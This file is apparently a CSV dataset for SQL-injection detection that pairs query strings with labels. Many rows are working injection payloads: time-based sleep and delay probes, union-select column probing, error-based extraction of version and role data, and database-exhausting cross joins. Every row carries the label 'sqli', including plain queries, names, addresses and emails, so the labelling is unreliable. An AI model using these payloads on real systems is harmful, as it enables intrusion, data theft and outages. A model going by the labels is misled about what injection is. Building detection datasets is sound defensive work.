query,label
"1'||  (  select 'dukt' where 3206  =  3206 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",sqli
"  SELECT whomID AS ID, careful AS darkness FROM mountain",sqli
SELECT * FROM design WHERE smoke  BETWEEN 10 AND 20,sqli
dao,sqli
or true--,sqli
SELECT * FROM  ( SELECT weak FROM breakfast ) ,sqli
SELECT * FROM tongue WHERE    NOT had = 'way',sqli
FROM  ( SELECT DISTINCT down FROM far ) ,sqli
6298940000000000,sqli
jane@23horas.ua,sqli
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367532 ) ,sqli
SELECT child FROM hurt,sqli
"   SELECT COUNT ( nearest ) , conversation FROM jack BY he",sqli
"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",sqli
1'||  (  select 'irfn' where 8360  =  8360,sqli
" SELECT column_name ( s )  FROM zipper,hot",sqli
laga_rtijo,sqli
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",sqli
gracomda7,sqli
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,sqli
"  SELECT difficultyID AS ID, save AS even FROM highest",sqli
barby,sqli
SELECT away ( s )  FROM clothing FULL OUTER JOIN,sqli
"   SELECT facing, mile, shells FROM equal WHERE dirty  IS NULL",sqli
SELECT they ( s FROM somewhere RIGHT JOIN,sqli
SELECT * FROM window WHERE coffee = 'tide',sqli
propaganda,sqli
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,sqli
admin'  )   or   (  '1'  =  '1'#,sqli
FROM  ( SELECT DISTINCT ocean FROM teacher ) ,sqli
moloney@imarbella.travel,sqli
1'   )    )    as hqhs where 5383  =  5383,sqli
desolladamen-te,sqli
SELECT atmosphere ( s FROM thread RIGHT JOIN,sqli
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM gather FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown,sqli
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2679' LIMIT 1,sqli
lagunaseca,sqli
asturias,sqli
1' where 2690  =  2690,sqli
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn",sqli
"   SELECT full, leg, lovelyFROM cause WHERE fastened  IS NOT NULL",sqli
SELECT Count ( * )  AS what,sqli
23550240b,sqli
ngoc,sqli
escuder liveris,sqli
SELECT ocean FROM ran,sqli
mahbeer,sqli
" SELECT * FROM certainly ORDER BY dozen, disease",sqli
1' and non_existant_table   =   '1,sqli
"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",sqli
SELECT dish ( s )  FROM bread UNION ALL,sqli
1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',sqli
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,sqli
"1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,sqli
4436070000000000,sqli
-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,sqli
SELECT thread ( s )  FROM whom UNION ALL,sqli
.11ne5o,sqli
SELECT AVG ( dot ) FROM building SELECT SUM ( noted ) ,sqli
13440,sqli
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo,sqli
SELECT COUNT ( wise ) FROM draw,sqli
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",sqli
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",sqli
SELECT column_name ( s )  FROM table1 UNION,sqli
"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sqli
SELECT * FROM glass  WHERE sometime NOT LIKE '[temperature]%',sqli
malacopterigio,sqli
"-2067"" or 3038  =  3038",sqli
"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",sqli
gibezzi scampini,sqli
gil,sqli
"-3037  )   where 9024  =  9024 union all select 9024,9024--",sqli
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",sqli
SELECT week ( s )  FROM outside SELECT pot FROM during,sqli
1 where 8532  =  8532,sqli
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",sqli
SELECT congress FROM church UNION ALL SELECT apple FROM warn ORDER BY name,sqli
miramar,sqli
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably,sqli
SELECT AVG ( snow ) FROM shirt,sqli
" select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",sqli
32806661j,sqli
SELECT * FROM frozen WHERE NOT crowd = 'forward'  AND NOT nor = 'soil',sqli
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,sqli
16856,sqli
stephen,sqli
baladora,sqli
37655511a,sqli
1  )   as lisg where 5490  =  5490,sqli
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym",sqli
"  SELECT * FROM pleasure WHERE dust IN  ( 'desk', 'paragraph', 'famous' )  ",sqli
z5r1174osa,sqli
42462633x,sqli
6341910000000000,sqli
SELECT * FROM recognize WHERE total = 'double'  AND  ( than = 'flow' OR tribe = 'beginning' ) ,sqli
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
vachiran,sqli
SELECT AVG ( easier ) FROM story,sqli
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",sqli
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,sqli
"calle venus, 81 2-a",sqli
plumero,sqli
"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",sqli
cortegana,sqli
SELECT * FROM mirror 3 SELECT * FROM pen,sqli
SELECT COUNT ( certain ) FROM factory,sqli
48825670m,sqli
viana de jadraque,sqli
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,sqli
DELETE FROM half,sqli
FROM  ( SELECT DISTINCT therefore FROM recall ) ,sqli
SELECT * FROM flower WHERE mail IN  ( SELECT source FROM these ) ,sqli
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",sqli
"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
1'   )    )     )   rlike sleep  (  5  )  #,sqli
"  SELECT mostID AS ID, my AS principle FROM sheep",sqli
1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sqli
casademonts,sqli
9366,sqli
-8878' in boolean mode  )   union all select 7785#,sqli
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,sqli
19784273h,sqli
-9264'  )   or 8571  =  8571--,sqli
50645313a,sqli
"-4406%' union all select 9599,9599,9599,9599#",sqli
041!da2131434e,sqli
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,sqli
hermida fiordalizzi,sqli
"  UPDATE brought SET again =  'center', City =  'father' WHERE tongue =  grown",sqli
dottin,sqli
SELECT TOP 50 PERCENT * FROM frame SELECT * FROM member FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM toward,sqli
SELECT AVG ( Price ) FROM empty,sqli
1'+  (  select hvsb where 3666  =  3666,sqli
SELECT * FROM let WHERE read LIKE '%magic%',sqli
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",sqli
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
valverde de alcal,sqli
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,sqli
mirko,sqli
boisvert,sqli
SELECT * FROM thee 3 SELECT * FROM molecular,sqli
"1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",sqli
1  )   where 4600  =  4600 or sleep  (  5  )  --,sqli
1'   )    )    and 3814  =  4272--,sqli
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",sqli
" SELECT * FROM swept ORDER BY beginning, including",sqli
ocallaghan@asyra.li,sqli
select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,sqli
SELECT MIN ( spirit )  AS plastic FROM expect,sqli
"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",sqli
SELECT * FROM price WHERE frame BETWEEN '1996-07-01' AND '1996-07-31',sqli
"1',iif  (  6625  =  6625,1,1/0  )  ",sqli
1 where 6365  =  6365,sqli
"-7514%""   )    )     )   or 2448  =  8797#",sqli
"1 union all select null,null,null,null,null,null,null,null--",sqli
graydon,sqli
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",sqli
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mirror,sqli
SELECT its FROM deal,sqli
37428,sqli
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",sqli
34120,sqli
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',sqli
"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",sqli
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",sqli
" SELECT column_name ( s )  FROM rule,bat",sqli
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",sqli
29385081m,sqli
SELECT COUNT ( those )  FROM mission,sqli
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",sqli
"1%""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,sqli
cazallas caminal,sqli
beilul,sqli
DELETE FROM statement,sqli
"  SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb",sqli
credenciales incorrectas,sqli
SELECT railroad ( s )  FROM bar LEFT JOIN,sqli
1  )   where 6472  =  6472,sqli
SELECT * FROM sent 3,sqli
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",sqli
SELECT * FROM drop WHERE human = 'unknown' LIMIT 3,sqli
oke,sqli
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",sqli
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",sqli
SELECT * FROM vertical  WHERE mix NOT LIKE '[grown]%',sqli
SELECT TOP 3 * FROM list WHERE build = 'pilot' SELECT * FROM native,sqli
SELECT * FROM angry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,sqli
end and    (    (     (  'hwrs' like 'hwrs,sqli
"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
SELECT AVG ( source ) FROM failed SELECT SUM ( sky ) ,sqli
"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sqli
SELECT COUNT ( smoke ) FROM enter,sqli
stefana1,sqli
"SELECT * FROM fruit WHERE winter BETWEEN ""shoot"" AND    ""tape""",sqli
"1  )   union all select null,null--",sqli
rascel-byatt@discotecateatre.ug,sqli
SELECT depend ( s )  FROM larger LEFT JOIN,sqli
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",sqli
SELECT help ( s )  FROM bat SELECT cap ( s ) ,sqli
linas,sqli
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",sqli
"  SELECT * FROM brain WHERE cloud NOT IN  ( 'hardly', 'function', 'excellent' )  ",sqli
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg",sqli
DELETE FROM coat WHERE won = 'driving',sqli
roldan@intelethernet.gl,sqli
"  SELECT seasonID AS ID, means AS known FROM weigh",sqli
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",sqli
1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',sqli
"1'||  (  select 'ttyt' where 3751  =  3751 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
"   SELECT final,new,key,manufacturing,happy     (  (  he JOIN potatoes ON process.no =  community.central )   INNER JOIN stoppedON Orders.pale =  mixture.highestID ) ",sqli
swinton@voragolive.kz,sqli
SELECT * FROM fast WHERE tribe BETWEEN '1996-07-01' AND '1996-07-31',sqli
end and    (    (     (  '%'  =  ',sqli
SELECT * FROM pride WHERE pay = 'after'  AND  ( built = 'safe' OR brain = 'string' ) ,sqli
4562,sqli
82380804w,sqli
rowen,sqli
6267,sqli
ubaldino,sqli
 or pg_sleep  (  __TIME__  )  --,sqli
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",sqli
"-6084'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'dfcp'  =  'dfcp",sqli
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",sqli
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,sqli
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",sqli
SELECT hidden ( s FROM kill RIGHT JOIN,sqli
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',sqli
vallb remesar,sqli
74725623a,sqli
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,sqli
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",sqli
SELECT * FROM  ( SELECT now FROM depend ) ,sqli
"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",sqli
humfrey,sqli
SELECT aside ( s )  FROM master UNION,sqli
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",sqli
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,sqli
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
SELECT * FROM look WHERE living = 'given'  AND City = 'face',sqli
SELECT * FROM stream,sqli
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,sqli
getulio,sqli
"c/ fuente del peral 41,",sqli
waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,sqli
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",sqli
SELECT * FROM necessary WHERE due BETWEEN thee09/01/1996window AND led15/31/1996stone,sqli
2252,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
SELECT * FROM social FETCH FIRST 50 PERCENT ROWS ONLY,sqli
avenida presidente carrero blanco 134,sqli
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,sqli
SELECT headed ( s )  FROM threw FULL OUTER JOIN,sqli
finak,sqli
SELECT * FROM bread WHERE war = 'damage',sqli
SELECT MIN ( pig )  AS pack FROM soil,sqli
"  SELECT * FROM pressure WHERE cowboy NOT IN  ( 'apple', 'remain', 'month' )  ",sqli
"SELECT * FROM Customers WHERE City  =  @City AND PostalCode  =  @PostalCode GO;  EXEC SelectAllCustomers @City  =  'London', @PostalCode  =  'WA1 1DP';",sqli
"  SELECT * FROM double WHERE plane NOT IN  ( 'what', 'thus', 'travel' )  ",sqli
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",sqli
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",sqli
SELECT TOP 3 * FROM name WHERE tiny = 'ice' SELECT * FROM gain,sqli
8400069999999999,sqli
31414,sqli
"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",sqli
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,sqli
"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
SELECT MIN ( drove )  AS list FROM tears,sqli
"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",sqli
SELECT AVG ( relationship ) FROM fox,sqli
5320,sqli
SELECT * FROM dream WHERE bank BETWEEN 'machine' AND 'tin',sqli
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",sqli
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,sqli
SELECT AVG ( layers ) FROM lady SELECT SUM ( writing ) ,sqli
"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """,sqli
querbico,sqli
SELECT * FROM  ( SELECT private FROM said ) ,sqli
"1   )    )    as acni where 6355  =  6355 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",sqli
"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",sqli
" SELECT * FROM putting ORDER BY thought, nice",sqli
SELECT rush ( s )  FROM force UNION ALL,sqli
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
SELECT * FROM  ( SELECT quiet FROM perfect ) ,sqli
1'  )   as uaoz where 2464  =  2464,sqli
palau-saverdera,sqli
40542,sqli
quebrador,sqli
1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,sqli
"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
edlene,sqli
"-5062""   )    )     )   union all select 4125,4125--",sqli
select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,sqli
SELECT * FROM command WHERE carry = 'forward'  OR properly = 'outer',sqli
SELECT COUNT ( villageID ) FROM as,sqli
SELECT * FROM win WHERE silver = 'dance' FETCH FIRST 3 ROWS ONLY,sqli
arine,sqli
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",sqli
"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",sqli
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,sqli
verghese,sqli
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,sqli
"  SELECT * FROM simply WHERE farmer NOT IN  ( 'original', 'create', 'heat' )  ",sqli
SELECT * FROM route ORDER BY he,sqli
" SELECT * FROM around ORDER BY popular ASC, than DESC",sqli
45641,sqli
SELECT AVG ( except )  FROM speak  SELECT SUM ( sang ) ,sqli
SELECT * FROM perfect,sqli
"1""  )   where 9447  =  9447",sqli
SELECT AVG ( river )  FROM football  SELECT SUM ( shade ) ,sqli
89388462c,sqli
SELECT TOP 3 * FROM tobacco,sqli
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot',sqli
-6218'   )    )    or 2236  =  4469#,sqli
DELETE FROM please,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC",sqli
vilalba sasserra,sqli
1'  )   where 7903  =  7903,sqli
SELECT * FROM winter WHERE thumb = 'drew' FETCH FIRST 3 ROWS ONLY,sqli
SELECT TOP 3 * FROM lips WHERE walk = 'fence',sqli
"  SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",sqli
SELECT entire,sqli
43774,sqli
SELECT * FROM command WHERE north = 'ear',sqli
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",sqli
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",sqli
"   SELECT occur, was, castFROM make WHERE outline  IS NOT NULL",sqli
v,sqli
"INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  ",sqli
â or 1  =  1 --,sqli
maijhara,sqli
mallejac,sqli
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703,sqli
end and '%'  =  ',sqli
zacaras,sqli
3154020000000000,sqli
rasmia,sqli
"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",sqli
10302390t,sqli
SELECT COUNT ( pick ) FROM guard,sqli
SELECT * FROM forth WHERE physical NOT BETWEEN 'jump' AND 'each',sqli
"INSERT INTO chair ( answer, action, pictured, disease, end, screen )  VALUES  ( 'scene', 'idea'. likely', 'made', 'donkey', 'land', 'atomic' )  ",sqli
SELECT * FROM  ( SELECT theory FROM machinery ) ,sqli
22496795n,sqli
9570,sqli
SELECT TOP 3 * FROM believed SELECT * FROM lift 3SELECT * FROM meet,sqli
SELECT * FROM just WHERE cave = 'twenty'  AND  ( baseball = 'volume' OR struggle = 'available' ) ,sqli
"1%'   )    )    union all select null,null#",sqli
SELECT * FROM pair WHERE Price NOT BETWEEN 10 AND 20,sqli
